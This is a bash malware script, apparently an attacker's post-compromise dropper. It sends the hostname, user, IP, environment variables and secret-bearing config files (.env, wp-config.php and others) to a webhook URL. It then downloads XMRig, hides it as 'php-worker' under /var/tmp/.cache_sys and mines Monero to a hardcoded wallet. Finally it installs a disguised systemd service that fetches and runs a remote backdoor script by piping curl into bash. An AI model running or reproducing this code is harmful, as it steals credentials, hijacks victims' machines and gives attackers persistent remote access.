#!/bin/bash

# ==========================================
# CONFIGURATION
# ==========================================
EXFIL_URL="https://webhook.site/a8e824a9-2309-449b-91a5-9a8e0f9cbf9b"
XMR_WALLET="48NLrGJrDCsB3oiLKVTWVPBBEb9qCb7pcQTgmv2qpR1v8wP8qnzV6Ewfvg9aZf5tkHHbdudqaUn2DQsDKVn2yri7DRRejvX"
HSOCKET_KEY="Marsupilami666@@"
SERVICE_NAME="system-update-service"
# ==========================================

# 1. EXFILTRATION
echo "[*] Exfiltrating secrets..."
curl -X POST -d "host=$(hostname)" -d "user=$(whoami)" -d "ip=$(curl -s ifconfig.me)" "$EXFIL_URL" > /dev/null 2>&1
for file in .env .env.local config.js wp-config.php next.config.js; do
    [ -f "$file" ] && curl -X POST -d "filename=$file" -d "content=$(cat "$file")" "$EXFIL_URL" > /dev/null 2>&1
done
curl -X POST -d "filename=printenv" -d "content=$(printenv)" "$EXFIL_URL" > /dev/null 2>&1

# 2. INSTALL MINER (Stealth Mode)
echo "[*] Setting up Miner..."
HIDDEN_DIR="/var/tmp/.cache_sys"
HIDDEN_BIN="$HIDDEN_DIR/php-worker"

# Bersihkan
rm -rf $HIDDEN_DIR
mkdir -p $HIDDEN_DIR

# Download Versi STATIC
wget --no-check-certificate -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O $HIDDEN_DIR/update.tar.gz

if [ -s $HIDDEN_DIR/update.tar.gz ]; then
    echo "[+] Download success. Extracting..."
    tar -xf $HIDDEN_DIR/update.tar.gz -C $HIDDEN_DIR
    
    # Cari binary xmrig dan rename jadi php-worker
    find $HIDDEN_DIR -type f -name "xmrig" -exec mv {} $HIDDEN_BIN \;
    
    if [ -f "$HIDDEN_BIN" ]; then
        chmod +x $HIDDEN_BIN
        echo "[+] Miner hidden at $HIDDEN_BIN"
    else
        echo "[-] Failed to find xmrig binary."
    fi
    
    # Hapus file sampah
    rm -f $HIDDEN_DIR/update.tar.gz
else
    echo "[-] Download failed."
fi

# 3. PERSISTENCE (Systemd - Root Only)
if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    echo "[*] Root detected. Installing Systemd Service..."
    
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
# Jalankan Miner (php-worker) DAN Backdoor HSocket
ExecStart=/bin/bash -c '$HIDDEN_BIN -o pool.hashvault.pro:443 -u ${XMR_WALLET} -p x -k --tls --background; export GS_SECRET="${HSOCKET_KEY}"; curl -fsSL https://hsocket.io/8 | bash'
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
    echo "[+] Persistence installed via Systemd."

else
    # 4. FALLBACK (Non-Root)
    echo "[*] Non-root environment. Using nohup..."
    
    if [ -x "$HIDDEN_BIN" ]; then
        nohup "$HIDDEN_BIN" -o pool.hashvault.pro:443 -u "$XMR_WALLET" -p x -k --tls --background > /dev/null 2>&1 &
    fi
    
    export GS_SECRET="$HSOCKET_KEY"
    nohup bash -c "$(curl -fsSL https://hsocket.io/8)" > /dev/null 2>&1 &
fi

echo "[+] PWNED. Check your webhook & wallet."
